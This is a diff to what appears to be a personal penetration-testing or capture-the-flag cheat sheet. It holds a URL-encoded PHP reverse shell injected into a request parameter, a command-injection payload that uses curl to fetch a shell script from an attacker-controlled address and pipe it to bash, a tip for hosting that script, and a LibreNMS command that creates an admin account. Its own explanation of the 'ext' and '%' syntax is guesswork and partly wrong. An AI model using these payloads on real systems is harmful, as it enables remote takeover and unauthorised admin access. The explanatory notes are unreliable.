@@ -241,6 +241,21 @@ It doesn't show error message, you can inject with php reverse shell (url encodi
 what=order&id=4$(php+-r+'$sock%3dfsockopen("10.4.52.17",1234)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b')
 ____________________________________________________________________________________________________________________________________________
 
+**If reverse shell didn't work, use curl to upload revershell.sh file to the server**
+Sometimes when uploading shell.sh file with python http.server , it didn't work. At that time try use with PHP Server.
+----------------------------------------------------------------------------------------------------------------------
 
+ext::sh -c curl% http://10.10.16.25/shell.sh|bash (revershell download in the server)
+
+#php -S 0.0.0.0:80 (upload)
+
+"ext" likely stands for "execute external command" or "external command.
+It indicates that the following command should be executed as an external command, rather than as part of the current shell script or command.
+'%': This is not a standard option for curl. It's possible that it was meant to be &&, which is used to chain commands together so that the second command (bash) is executed only if the first command (curl) succeeds.
+____________________________________________________________________________________________________________________________________________
+In librenms, adduser admin user is
+-------------------------------------
+#cd /opt/librenms
+#./adduser.php test test123 10  (level 10 is admin)
 
 
